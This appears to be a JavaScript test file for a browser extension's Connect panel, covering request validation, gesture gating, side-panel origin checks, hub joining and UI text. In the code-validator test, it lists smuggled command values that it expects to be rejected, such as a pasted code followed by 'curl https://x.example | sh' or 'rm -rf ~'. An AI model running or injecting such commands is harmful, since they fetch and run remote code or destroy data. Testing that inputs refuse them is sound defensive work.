// The side panel's Connect pieces that don't need a browser: the relay's first check, the text
// helpers, and the header, tab and welcome wiring the UX review asked for.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { checkConnectRequest } from "../src/connect/check.ts";
import { connectorUrl, countdown, lastSeen, linkCommand } from "../src/connect/format.ts";
import { CONNECT_METHODS, GESTURE_METHODS } from "../src/connect/types.ts";

const repo = join(dirname(fileURLToPath(import.meta.url)), "..");
const read = (f) => readFileSync(join(repo, f), "utf8");

test("the relay passes only known methods with object params, and names the id of a refused one", () => {
	assert.deepEqual([...CONNECT_METHODS], ["status", "approvalCode", "deviceCode", "setBusy", "joinHub", "setupTunnel", "setTheme", "remoteState", "remoteSetup", "remoteFunnel", "remoteTest", "remoteFixPlan", "remoteFix"]);
	assert.deepEqual(checkConnectRequest({ id: 1, method: "status" }), { ok: true, request: { id: 1, method: "status" } });
	assert.deepEqual(checkConnectRequest({ id: 2, method: "setBusy", params: { busy: true } }).request.params, { busy: true });
	for (const bad of [{ id: 3, method: "link.off" }, { id: 3, method: "__proto__" }, { id: 3, method: 5 }, { id: 3, method: "status", params: [] }, { id: 3, method: "status", params: "x" }, { id: 3, method: "status", params: null }]) {
		const r = checkConnectRequest(bad);
		assert.equal(r.ok, false, JSON.stringify(bad));
		assert.equal(r.id, 3);
	}
	for (const bad of [null, undefined, "status", { method: "status" }, { id: "1", method: "status" }]) assert.equal(checkConnectRequest(bad).ok, false);
});

test("countdown and last-seen read as a person would say them", () => {
	assert.equal(countdown(10 * 60_000, 0), "10:00");
	assert.equal(countdown(9 * 60_000 + 41_000, 0), "9:41");
	assert.equal(countdown(65_000, 0), "1:05");
	assert.equal(countdown(1000, 1000), "");
	assert.equal(countdown(0, 5000), "");
	const now = Date.parse("2026-11-02T12:00:00Z");
	assert.equal(lastSeen(null, now), "never");
	assert.equal(lastSeen("garbage", now), "never");
	assert.equal(lastSeen("2026-11-02T11:59:30Z", now), "just now");
	assert.equal(lastSeen("2026-11-02T11:59:00Z", now), "1 minute ago");
	assert.equal(lastSeen("2026-11-02T11:55:00Z", now), "5 minutes ago");
	assert.equal(lastSeen("2026-11-02T09:00:00Z", now), "3 hours ago");
	assert.equal(lastSeen("2026-11-01T11:00:00Z", now), "1 day ago");
	assert.equal(connectorUrl("https://h.example.com"), "https://h.example.com/mcp");
	assert.equal(linkCommand("https://h.example.com", "TK-ABCD-EFGH"), "polycarp browser link https://h.example.com --code TK-ABCD-EFGH");
});

test("Settings has seven tabs, with Connect under Agents and Costs under About", () => {
	const panel = read("src/sidepanel.ts");
	const start = panel.indexOf("SettingsPage.open([");
	const list = panel.slice(start, panel.indexOf("]);\n", start));
	// Top-level entries only: a tab, or a combined tab by its name.
	const order = list
		.split("\n")
		.map((line) => /^\t\t(?:new CombinedTab\("(\w+)"|new (\w+)\(|(providers),)/.exec(line))
		.filter(Boolean)
		.map((m) => m[1] ?? m[2] ?? m[3]);
	assert.deepEqual(order, ["providers", "Agents", "SkillsTab", "SiteEditsTab", "Privacy", "AppearanceTab", "About"]);
	assert.match(read("src/dialogs/BridgeTab.ts"), /getTabName\(\): string \{\s*return "Agents";/);
	assert.match(read("src/dialogs/ConnectTab.ts"), /return "Connect";/);
	assert.match(read("src/dialogs/AppearanceTab.ts"), /return "Appearance";/);
});

test("the welcome dialog offers Connect, and Chat here opens Providers at the top, with Free mode first", () => {
	const welcome = read("src/dialogs/WelcomeSetupDialog.ts");
	assert.match(welcome, /Use from claude\.ai or ChatGPT/);
	assert.match(welcome, /Chat here/);
	const panel = read("src/sidepanel.ts");
	assert.match(panel, /choice === "connect"\s*\?\s*\{ tab: "Agents", anchor: "connect-heading" \}\s*:\s*\{ tab: "Providers" \}/);
	assert.match(read("src/dialogs/ApiKeysTab.ts"), /id="api-keys-heading"/);
});

test("with no provider the composer's model button reads Add a provider", () => {
	const panel = read("src/sidepanel.ts");
	assert.match(panel, /if \(providerless\)\s+return \{ content: "Add a provider"/);
	assert.match(panel, /provider-key-saved", "provider-key-removed"/);
});

test("every icon-only header button has an aria-label and a visible tooltip", () => {
	const panel = read("src/sidepanel.ts");
	// headerButton sets both from one label.
	assert.match(panel, /function headerButton\([^)]*\)[\s\S]{0,200}aria-label=\$\{label\} data-tip=\$\{label\}/);
	for (const label of ["Past chats", "New chat", "Settings"]) assert.match(panel, new RegExp(`headerButton\\("${label}"`));
	// The More menu button carries both too.
	const menu = read("src/components/HeaderMenu.ts");
	assert.match(menu, /aria-label=\$\{this\.label\}\s+data-tip=\$\{this\.label\}/);
	assert.match(panel, /<tk-header-menu \.items=\$\{moreMenuItems\(\)\} label="More">/);
	// The recording pill and the Artifacts button too.
	assert.match(panel, /aria-label="Stop recording and save as a skill"\s+data-tip="Stop recording and save as a skill"/);
	// The theme items left the More menu; one Theme entry opens Appearance.
	assert.doesNotMatch(panel, /Light theme|Dark theme|Match the system/);
	assert.match(panel, /label: "Theme"[^}]*openApiKeysDialog\(\{ tab: "Appearance" \}\)/);
});

test("Privacy keeps one sentence visible and every long explanation in a named disclosure, text unchanged", () => {
	const text = read("src/dialogs/PrivacyTab.ts");
	assert.equal((text.match(/<summary/g) ?? []).length >= 2, true);
	assert.doesNotMatch(text, />Details</, "a disclosure says what it holds");
	// The original explanations survive word for word.
	for (const kept of [
		"The side panel agent then runs only OpenRouter models, sent with zero data retention required and no",
		"Ollama cloud model) is still a cloud service: don't use one in private mode.",
		"Prefer names over IPs (for example mac.example.ts.net): a listed IP is trusted on every network, including one where it belongs to someone else.",
		"Keeps a copy of your side panel chats in ~/.local/share/polycarp/browser/threads (readable only by your user), so",
		"Nothing is sent: you review the report here, copy it, and paste it into a GitHub issue yourself.",
	]) {
		assert.ok(text.includes(kept), `missing: ${kept}`);
	}
});

test("Page scripts reads as one plain sentence with the old wording under Details", () => {
	const text = read("src/dialogs/BridgeTab.ts");
	assert.match(text, /Turning this on makes agents' page scripts run faster\./);
	assert.match(text, /Polycarp has not been granted the userScripts permission\./);
	assert.match(text, /<summary class="cursor-pointer text-foreground">Details<\/summary>/);
	// The jargon is no longer a visible line.
	assert.doesNotMatch(text, /line\(\s*['"]Off: Polycarp has not been granted/);
});

// ---------- round-1 review fixes ----------

test("a code reply is drawn only when the code is TK-XXXX-XXXX and the origin an origin", async () => {
	const { validApprovalCode, validDeviceCode } = await import("../src/connect/format.ts");
	const soon = Date.now() + 600_000;
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl: "https://hub.example.com/mcp" }), true);
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "https://hub.example.com" }), true);
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "http://127.0.0.1:8787" }), true);
	for (const code of ["TK-ABCD-EFGH; curl https://x.example | sh", "TK-ABCD-EFGH\nrm -rf ~", "tk-abcd-efgh", "TK-ABCD", "", 5, undefined]) {
		assert.equal(validApprovalCode({ code, expiresAt: soon, connectorUrl: "https://hub.example.com/mcp" }), false, String(code));
		assert.equal(validDeviceCode({ code, expiresAt: soon, hubUrl: "https://hub.example.com" }), false, String(code));
	}
	for (const hubUrl of ["https://hub.example.com/x", "https://hub.example.com; id", "hub.example.com", "https://a b", "", undefined]) {
		assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl }), false, String(hubUrl));
	}
	for (const connectorUrl of ["https://hub.example.com", "https://hub.example.com/mcp?x", "https://hub.example.com/mcp; id", undefined]) {
		assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl }), false, String(connectorUrl));
	}
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: "soon", connectorUrl: "https://hub.example.com/mcp" }), false);
	assert.equal(validApprovalCode(undefined), false);
	// The tab checks at mint and again before it draws a code box or the command that carries one.
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /if \(!validApprovalCode\(made\)\) throw/);
	assert.match(tab, /if \(!validDeviceCode\(made\)\) throw/);
	assert.match(tab, /validApprovalCode\(this\.approval\) \? this\.codeBox/);
	assert.match(tab, /validDeviceCode\(this\.device\) \? this\.codeBox/);
	assert.match(tab, /validDeviceCode\(this\.device\) && countdown/);
});

test("Busy has its own error line that the status poll does not clear, and the switch follows the host", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const load = /private async load\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.doesNotMatch(load, /busyError/, "load() must not clear the busy error");
	const setBusy = /private async setBusy[\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.match(setBusy, /this\.busyError = err instanceof Error/);
	assert.doesNotMatch(setBusy, /this\.error =/);
	assert.match(tab, /\$\{this\.busyError \? html`<p[^>]*role="alert"/);
	assert.match(tab, /\.checked=\$\{live\(link\.busy\)\}/, "a refused toggle snaps back even when the value did not change");
});

test("the join form is hidden while the helper reports a config problem; loading, minting and joining reset in finally", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /if \(s\.route !== "none" \|\| s\.problem\) return nothing;/);
	for (const name of ["load", "mint", "setBusy", "join"]) {
		const body = new RegExp(`private async ${name}\\([\\s\\S]*?\\n\\t\\}\\n`).exec(tab)[0];
		assert.match(body, /finally \{/, `${name} resets its flag in finally`);
	}
	assert.match(/private async join\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /finally \{\s*this\.joining = undefined;/);
});

/** Stand in for the browser's record of a recent click. */
function activation(isActive) {
	Object.defineProperty(globalThis.navigator, "userActivation", { value: { isActive }, configurable: true });
}

/** A chrome.runtime.connect whose port records what is posted and lets the test answer. */
function fakePort() {
	const port = { posted: [], listener: undefined, onDisconnect: undefined };
	globalThis.chrome = {
		runtime: {
			connect: () => ({
				postMessage: (m) => port.posted.push(m),
				onMessage: { addListener: (f) => (port.listener = f) },
				onDisconnect: { addListener: (f) => (port.onDisconnect = f) },
			}),
		},
	};
	return port;
}

test("a request the helper never answers fails with no_reply after 20 s (30 s for joinHub), and an answer cancels the timer", async (t) => {
	t.mock.timers.enable({ apis: ["setTimeout"] });
	const port = fakePort();
	activation(true);
	const client = await import("../src/connect/client.ts?timeout");
	assert.equal(client.REQUEST_TIMEOUT_MS, 20_000);
	assert.equal(client.JOIN_TIMEOUT_MS, 30_000);

	const status = client.connectStatus().catch((e) => e);
	t.mock.timers.tick(19_999);
	assert.equal(port.posted.length, 1);
	t.mock.timers.tick(1);
	const err = await status;
	assert.ok(err instanceof client.ConnectRequestError);
	assert.equal(err.code, "no_reply");
	assert.equal(err.message, "Polycarp's helper didn't answer. Update it: polycarp browser update (or polycarp-browser update if you built the helper yourself)");
	assert.equal(client.isNoHost(err), false);
	// A late answer for the forgotten request is ignored.
	port.listener({ id: port.posted[0].id, result: { route: "none" } });

	// joinHub gets 30 s, and progress from the helper restarts the wait.
	const steps = [];
	const join = client.connectJoinHub("https://hub.example.com", "TK-ABCD-EFGH", undefined, (s) => steps.push(s)).catch((e) => e);
	const joinId = port.posted.at(-1).id;
	t.mock.timers.tick(29_999);
	port.listener({ id: joinId, progress: { step: "service" } });
	t.mock.timers.tick(29_999);
	assert.deepEqual(steps, ["service"]);
	port.listener({ id: joinId, result: { name: "laptop", manage: false } });
	assert.deepEqual(await join, { name: "laptop", manage: false });
	t.mock.timers.tick(120_000); // nothing left to expire

	// An answer in time resolves and leaves no timer behind; a lost port rejects what is waiting.
	const ok = client.connectStatus();
	port.listener({ id: port.posted.at(-1).id, result: { route: "none" } });
	assert.deepEqual(await ok, { route: "none" });
	const lost = client.connectApprovalCode().catch((e) => e);
	port.onDisconnect();
	assert.equal((await lost).code, "no_host");
	t.mock.timers.tick(120_000);
});

test("the relay forgets a request the host never answers, and clears the timer when it is answered or the panel leaves", () => {
	const relay = read("src/connect/relay.ts");
	assert.match(relay, /export const RELAY_WAIT_MS = 60_000;/);
	assert.match(relay, /const forget = \(hostId: number\)[\s\S]*?clearTimeout\(waiting\.get\(hostId\)\?\.timer\);\s*waiting\.delete\(hostId\);/);
	assert.match(relay, /if \(message\.error \|\| reply\.result !== undefined\) forget\(message\.id\);/);
	assert.match(relay, /if \(w\.port === port\) forget\(hostId\);/);
});

test("a hub at http://[::1]:port passes the panel's shape checks, as it does the host's", async () => {
	const { validApprovalCode, validDeviceCode } = await import("../src/connect/format.ts");
	const soon = Date.now() + 600_000;
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "http://[::1]:8787" }), true);
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl: "http://[::1]:8787/mcp" }), true);
	for (const hubUrl of ["http://[::2]:8787", "http://[::1", "http://[::1]x", "http://[::1]/x"]) assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl }), false, hubUrl);
});

test("Join a hub asks for a Device code from Add a device, takes an optional name, and tells a silent helper after the link step", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /a device code from Settings › Agents › Your devices › Add a device on the hub \(or a manager device\)/);
	assert.match(tab, /<span>Device code<\/span>/);
	assert.doesNotMatch(tab, /<span>Connect code<\/span>/);
	assert.match(tab, /<span>Device name \(optional\)<\/span>/);
	assert.match(tab, /this\.joinName\.trim\(\) \|\| undefined/);
	assert.match(tab, /Polycarp may have linked this device\. Reopen Settings to check\./);
	assert.match(tab, /linkWritten && err instanceof ConnectRequestError && err\.code === "no_reply"/);
});

test("checkConnectRequest refuses a method that is not a string without coercing it", () => {
	for (const method of [{ toString: 0 }, { toString: "x" }, 5, null, ["status"]]) {
		const out = checkConnectRequest({ id: 4, method });
		assert.equal(out.ok, false);
		assert.equal(out.id, 4);
	}
	assert.equal(checkConnectRequest({ id: 4, method: "status" }).ok, true);
});

// ---------- round 2 review fixes ----------

const ORIGIN = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/";

test("first-F1: the relay serves only the side panel document, never a tab, another page or a content script", async () => {
	const { isSidePanelPort } = await import("../src/connect/gate.ts");
	const panel = `${ORIGIN}sidepanel.html`;
	assert.equal(isSidePanelPort({ url: panel }, ORIGIN), true);
	assert.equal(isSidePanelPort({ url: panel, origin: ORIGIN.slice(0, -1) }, ORIGIN), true);
	assert.equal(isSidePanelPort({ url: `${panel}?x=1#y` }, ORIGIN), true);
	// The panel opened as a tab: a browser-driving client can reach that.
	assert.equal(isSidePanelPort({ url: panel, tab: { id: 7 } }, ORIGIN), false, "a tab-hosted panel was served");
	// Other extension pages, a content script, a look-alike, nothing.
	for (const url of [`${ORIGIN}options.html`, `${ORIGIN}sidepanel.html/x`, `${ORIGIN}x/sidepanel.html`, "https://evil.example/sidepanel.html", "chrome-extension://zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/sidepanel.html", undefined, "not a url"]) {
		assert.equal(isSidePanelPort({ url }, ORIGIN), false, String(url));
	}
	assert.equal(isSidePanelPort({ url: panel, origin: "https://evil.example" }, ORIGIN), false);
	assert.equal(isSidePanelPort(undefined, ORIGIN), false);
});

test("first-F1: approvalCode, deviceCode and joinHub need a fresh, unused gesture token; the others do not", async () => {
	const { GestureGate } = await import("../src/connect/gate.ts");
	let now = 1_000_000;
	const gate = new GestureGate(() => now);
	for (const method of ["approvalCode", "deviceCode", "joinHub"]) {
		assert.equal(gate.allows(method, undefined), false, `${method} without a gesture`);
		assert.equal(gate.allows(method, { token: `t-${method}`, at: now }), true, `${method} with one`);
		assert.equal(gate.allows(method, { token: `t-${method}`, at: now }), false, `${method}: a token works once`);
	}
	assert.equal(gate.allows("approvalCode", { token: "old", at: now - 5_001 }), false, "stale");
	assert.equal(gate.allows("approvalCode", { token: "edge", at: now - 5_000 }), true);
	assert.equal(gate.allows("approvalCode", { token: "future", at: now + 5_000 }), false, "from the future");
	for (const method of ["status", "setBusy", "setTheme"]) assert.equal(gate.allows(method, undefined), true, method);
	// The same token can be reused after it has aged out of the gate's memory only if it is also too old to pass.
	now += 60_000;
	assert.equal(gate.allows("joinHub", { token: "t-joinHub", at: now - 59_000 }), false);
	// check.ts carries a well-formed gesture and refuses a malformed one.
	const { checkConnectRequest } = await import("../src/connect/check.ts");
	assert.deepEqual(checkConnectRequest({ id: 1, method: "joinHub", gesture: { token: "a", at: 5 } }).request.gesture, { token: "a", at: 5 });
	for (const gesture of [null, "x", { token: 5, at: 1 }, { token: "a" }, { token: "a", at: "1" }, { token: "x".repeat(65), at: 1 }]) assert.equal(checkConnectRequest({ id: 1, method: "joinHub", gesture }).ok, false, JSON.stringify(gesture));
});

test("first-F1: the real relay refuses a tab-hosted panel and a missing gesture, and never forwards the gesture to the host", async (t) => {
	const { installFakeChrome } = await import("./fake-chrome.mjs");
	const priorChrome = globalThis.chrome;
	installFakeChrome();
	t.after(() => {
		globalThis.chrome = priorChrome;
	});
	let onConnect;
	chrome.runtime.getURL = () => ORIGIN;
	chrome.runtime.onConnect = { addListener: (f) => (onConnect = f) };
	const relay = await import("../src/connect/relay.ts");
	// A connected native port that records what the relay sends to the host.
	const native = await import("../src/bridge/native.ts");
	// The bridge and the relay arm timers that outlive this test (the bridge has no stop). Track every timer and
	// interval made while it runs and clear them all at the end, so none fires after the test has ended.
	const realSetTimeout = globalThis.setTimeout;
	const realSetInterval = globalThis.setInterval;
	const timers = [];
	const intervals = [];
	globalThis.setTimeout = (fn, ms, ...rest) => {
		const h = realSetTimeout(fn, ms, ...rest);
		timers.push(h);
		return h;
	};
	globalThis.setInterval = (fn, ms, ...rest) => {
		const h = realSetInterval(fn, ms, ...rest);
		intervals.push(h);
		return h;
	};
	t.after(() => {
		globalThis.setTimeout = realSetTimeout;
		globalThis.setInterval = realSetInterval;
		for (const h of timers) clearTimeout(h);
		for (const h of intervals) clearInterval(h);
	});
	let hostPort;
	const realConnectNative = chrome.runtime.connectNative;
	chrome.runtime.connectNative = (...args) => (hostPort = realConnectNative.apply(chrome.runtime, args));
	// The bridge has no stop: its timers are cleared above, and the fake host port is detached at the end.
	t.after(() => {
		chrome.runtime.connectNative = realConnectNative;
		hostPort?.onMessage.listeners.splice(0);
		hostPort?.onDisconnect.listeners.splice(0);
	});
	native.startBridge();
	assert.ok(hostPort, "the native port did not connect");
	const sent = { get length() { return hostPort.sent.filter((m) => m.type === "connect").length; }, frames: () => hostPort.sent.filter((m) => m.type === "connect") };
	relay.startConnectRelay();
	assert.equal(typeof onConnect, "function");
	const mkPort = (sender) => {
		const port = { name: "tabkyra-connect", sender, replies: [], disconnected: false, listener: undefined };
		port.postMessage = (m) => port.replies.push(m);
		port.disconnect = () => (port.disconnected = true);
		port.onMessage = { addListener: (f) => (port.listener = f) };
		port.onDisconnect = { addListener() {} };
		return port;
	};
	const tabPort = mkPort({ url: `${ORIGIN}sidepanel.html`, tab: { id: 3 } });
	onConnect(tabPort);
	assert.equal(tabPort.disconnected, true, "a tab-hosted panel kept its port");
	assert.equal(tabPort.listener, undefined);

	const panelPort = mkPort({ url: `${ORIGIN}sidepanel.html` });
	onConnect(panelPort);
	assert.equal(panelPort.disconnected, false);
	panelPort.listener({ id: 1, method: "approvalCode" });
	assert.equal(panelPort.replies[0].error.code, "no_gesture");
	assert.equal(sent.length, 0, "a code request without a gesture reached the host");
	// A fabricated token, a spent one, a stale one: none of them reaches the host.
	// Past the gate the request goes on to the host, and the recorded frame shows it.
	panelPort.listener({ id: 2, method: "status" });
	assert.equal(sent.length, 1, "a status request did not reach the host");
	assert.equal(sent.frames()[0].method, "status");
	panelPort.listener({ id: 3, method: "approvalCode", gesture: { token: "once", at: Date.now() } });
	assert.equal(sent.length, 2);
	assert.equal(sent.frames()[1].method, "approvalCode");
	assert.equal(sent.frames()[1].gesture, undefined, "the gesture went on to the host");
	panelPort.listener({ id: 4, method: "approvalCode", gesture: { token: "once", at: Date.now() } });
	assert.equal(panelPort.replies.at(-1).error.code, "no_gesture", "a spent token worked twice");
	panelPort.listener({ id: 5, method: "joinHub", params: { hubUrl: "https://h.example.com", code: "TK-ABCD-EFGH" }, gesture: { token: "stale", at: Date.now() - 60_000 } });
	assert.equal(panelPort.replies.at(-1).error.code, "no_gesture");
	assert.equal(sent.length, 2, "a refused request reached the host");
	// The frame the relay builds names its fields; the gesture is not among them.
	assert.doesNotMatch(/sendConnect\(\{[\s\S]*?\}\)/.exec(read("src/connect/relay.ts"))[0], /gesture/);
});

test("first-F1: the panel's client mints a gesture only while the click is live, and the relay's check has no test allowance", async () => {
	const port = fakePort();
	const client = await import("../src/connect/client.ts?gesture");
	activation(false);
	const refused = await client.connectApprovalCode().catch((e) => e);
	assert.equal(refused.code, "no_gesture");
	assert.equal(port.posted.length, 0, "a request left the panel without a click");
	assert.equal((await client.connectJoinHub("https://h.example.com", "TK-ABCD-EFGH", undefined, () => {}).catch((e) => e)).code, "no_gesture");
	activation(true);
	void client.connectApprovalCode().catch(() => {});
	assert.equal(port.posted.at(-1).method, "approvalCode");
	assert.match(port.posted.at(-1).gesture.token, /^[0-9a-f-]{36}$/);
	assert.ok(Math.abs(port.posted.at(-1).gesture.at - Date.now()) < 1000);
	void client.connectStatus().catch(() => {});
	assert.equal(port.posted.at(-1).gesture, undefined, "status needs no gesture");
	// Release builds carry no way around the check: the relay's decision is the gate's, with no flag.
	const relay = read("src/connect/relay.ts");
	const gate = read("src/connect/gate.ts");
	assert.match(relay, /if \(!isSidePanelPort\(port\.sender, origin\)\)/);
	for (const text of [relay, gate]) assert.doesNotMatch(text.replace(/\/\*[\s\S]*?\*\//g, ""), /TEST|process\.env|__TABKYRA|allowTab|globalThis/i);
});

test("first-F1: the bridge never opens Polycarp's own pages, in any permission mode, and never asks the user about them", async () => {
	const { installFakeChrome } = await import("./fake-chrome.mjs");
	const fake = installFakeChrome?.();
	void fake;
	chrome.runtime.id = "abcdefghijklmnopabcdefghijklmnop";
	const perms = await import("../src/bridge/permissions.ts?own");
	const own = `chrome-extension://${chrome.runtime.id}/sidepanel.html`;
	assert.equal(perms.isOwnExtensionUrl(own), true);
	assert.equal(perms.isOwnExtensionUrl(`chrome-extension://${chrome.runtime.id.toUpperCase()}/`), true);
	assert.equal(perms.isOwnExtensionUrl("chrome-extension://someotherextensionid/"), false);
	assert.equal(perms.isOwnExtensionUrl(`blob:chrome-extension://${chrome.runtime.id}/6f1c0c3e-2f4b-4a53-9d40-0e1f9f3a7b11`), true);
	assert.equal(perms.isOwnExtensionUrl(`filesystem:chrome-extension://${chrome.runtime.id}/temporary/x.html`), true);
	assert.equal(perms.isOwnExtensionUrl("blob:https://example.com/6f1c0c3e-2f4b-4a53-9d40-0e1f9f3a7b11"), false);
	assert.equal(perms.isOwnExtensionUrl("filesystem:https://example.com/temporary/x.html"), false);
	assert.equal(perms.isOwnExtensionUrl("https://example.com/"), false);
	assert.equal(perms.isOwnExtensionUrl("not a url"), false);
	await perms.setPermissionMode("allow_all");
	assert.equal(await perms.isUrlAllowed(`blob:chrome-extension://${chrome.runtime.id}/6f1c0c3e-2f4b-4a53-9d40-0e1f9f3a7b11`), false);
	assert.equal(await perms.isUrlAllowed("https://example.com/"), true);
	assert.equal(await perms.isUrlAllowed(own), false, "allow_all opened the extension's own page");
	await perms.setPermissionMode("ask");
	await perms.allowHost(chrome.runtime.id);
	assert.equal(await perms.isUrlAllowed(own), false, "an allowed host named like the extension id opened its page");
	// native.ts checks before it asks the user, and says why.
	const native = read("src/bridge/native.ts");
	assert.match(native, /async function askPermission\([^)]*\): Promise<boolean> \{\s*if \(isOwnExtensionUrl\(url\)\) return false;/);
	assert.match(native, /isOwnExtensionUrl\(url\)\s*\? "Not allowed to open Polycarp's own pages\."/);
});

test("first-F2: joining shows the hub's host, the warning and the scopes, and sends nothing until Confirm; success lists the scopes", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const format = read("src/connect/format.ts");
	assert.match(format, /export const JOIN_WARNING =\s*"The hub's owner will be able to open sites, read pages, and click and type in this browser as you\.";/);
	assert.match(tab, /\$\{JOIN_WARNING\}/);
	assert.match(tab, /Join \$\{this\.confirming\.host\}\?/);
	assert.match(tab, /This device will allow:[\s\S]*?this\.confirming\.scopes\.map\(\(x\) => html`<li>\$\{x\.what\}<\/li>`\)/);
	assert.doesNotMatch(tab, /the hub's default list/);
	// The Join hub button asks; only Confirm calls join().
	assert.match(tab, /children: "Join hub",[\s\S]*?onClick: \(\) => this\.askJoin\(s\)/);
	assert.match(tab, /children: "Confirm", onClick: \(\) => void this\.join\(\)/);
	assert.doesNotMatch(tab, /children: "Join hub",[\s\S]{0,80}void this\.join\(\)/);
	// What was confirmed is what is sent.
	assert.match(/private async join\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /connectJoinHub\(\s*confirmed\.hubUrl,\s*confirmed\.code,\s*confirmed\.name,/);
	assert.match(tab, /The hub may use this browser for: \$\{allowed\}/);
});

test("hubHost names the host as typed, a pasted connector URL included", async () => {
	const { hubHost } = await import("../src/connect/format.ts");
	assert.equal(hubHost("https://hub.example.com"), "hub.example.com");
	assert.equal(hubHost(" https://hub.example.com/mcp "), "hub.example.com");
	assert.equal(hubHost("hub.example.com"), "hub.example.com");
	assert.equal(hubHost("http://127.0.0.1:8787"), "127.0.0.1:8787");
	assert.equal(hubHost(""), undefined);
	assert.equal(hubHost("https://"), undefined);
	assert.equal(hubHost("a b"), undefined);
});

test("sol-F4: join progress and the outcome render outside the join form, and a service failure says to run polycarp browser link status", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const form = /private joinForm\([\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.doesNotMatch(form, /joinMessage|this\.joining\b[^)]*role="status"/, "the message is still drawn inside the form that the route change removes");
	assert.match(/private joinNotice\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /this\.joinMessage/);
	assert.match(/render\(\): TemplateResult[\s\S]*$/.exec(tab)[0], /\$\{this\.joinNotice\(\)\}[\s\S]*\$\{this\.assistants\(s\)\}/);
});

test("second-S2: on the link route the connector URL is the hub's own, shown once a code exists", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /s\.route === "link"\s*\?\s*validApprovalCode\(this\.approval\)\s*\?\s*this\.command\("Connector URL", this\.approval\.connectorUrl\)/);
	assert.match(tab, /Get a code to see the connector URL\./);
});

test("first-F3/second-G2: a helper that lists no scopes in {id, what} form gets no Confirm; the confirm lists descriptions, never 'the hub's choice'", async () => {
	const { joinScopesOf, helperOutOfDateMessage } = await import("../src/connect/format.ts");
	assert.equal(helperOutOfDateMessage(), "Polycarp's helper is out of date. Run polycarp browser update (or polycarp-browser update if you built the helper yourself), then try again.");
	const rows = [{ id: "browser.read", what: "See the agent's own tabs and read pages" }];
	assert.deepEqual(joinScopesOf({ joinScopes: rows }), rows);
	for (const bad of [undefined, [], ["browser.read"], [{ id: "a" }], [{ id: "", what: "x" }], [rows[0], null], "browser.read"]) assert.equal(joinScopesOf({ joinScopes: bad }), undefined, JSON.stringify(bad));
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(/private askJoin\([\s\S]*?\n\t\}\n/.exec(tab)[0], /const scopes = joinScopesOf\(s\);\s*if \(!scopes\) \{\s*this\.joinMessage = \{ ok: false, text: helperOutOfDateMessage\(\) \};\s*return;/);
	assert.doesNotMatch(tab, /joinScopes \?\? \[\]/);
});

test("second-G3: a confirm is dropped when a route or problem appears, and when the address, code or name is edited", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(/private async load\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /this\.status = await connectStatus\(\);[\s\S]*?if \(this\.status\.route !== "none" \|\| this\.status\.problem\) this\.confirming = undefined;/);
	for (const field of ["hubUrl", "joinCode", "joinName"]) assert.match(tab, new RegExp(`this\\.${field} = \\(e\\.target as HTMLInputElement\\)\\.value;\\s*this\\.confirming = undefined;`), field);
});

test("a helper that hasn't said its name gets both commands, and the one name once it has", async () => {
	const { builtHelperCommand, hostCommandText } = await import("../src/bridge/host-command.ts");
	// Tests run with no extension storage, so the helper never reports here.
	assert.equal(builtHelperCommand("setup"), "polycarp-browser setup");
	assert.equal(hostCommandText("setup"), "polycarp browser setup (or polycarp-browser setup if you built the helper yourself)");
	const panel = readFileSync(new URL("../src/dialogs/ConnectTab.ts", import.meta.url), "utf8");
	assert.match(panel, /builtHelperCommand\("setup"\) \? this\.command\("If you built the helper yourself"/);
	const host = readFileSync(new URL("../src/bridge/host-command.ts", import.meta.url), "utf8");
	assert.match(host, /known = true/, "reporting a name ends the two-name text");
});

// ---------- Set up with Cloudflare ----------

test("setupTunnel needs a click gesture, and its request waits seven minutes", async () => {
	assert.ok(GESTURE_METHODS.includes("setupTunnel"));
	const { GestureGate } = await import("../src/connect/gate.ts");
	const gate = new GestureGate(() => 1_000_000);
	assert.equal(gate.allows("setupTunnel", undefined), false);
	assert.equal(gate.allows("setupTunnel", { token: "t", at: 1_000_000 }), true);
	const client = await import("../src/connect/client.ts?setup");
	assert.equal(client.SETUP_TIMEOUT_MS, 7 * 60_000);
	assert.match(read("src/connect/client.ts"), /method === "setupTunnel" \? SETUP_TIMEOUT_MS/);
});

test("the one-button flow (with its Cloudflare form) shows for route none, Funnel and Cloudflare, and not for a custom address, a hub or a link", async () => {
	const { remoteFlowFor } = await import("../src/connect/remote-flow.ts");
	const base = { passcodeSet: false, theme: { preset: "default" } };
	assert.equal(remoteFlowFor({ ...base, route: "none" }), true);
	assert.equal(remoteFlowFor({ ...base, route: "remote", remoteKind: "funnel", publicUrl: "https://m.ts.net:8443" }), true);
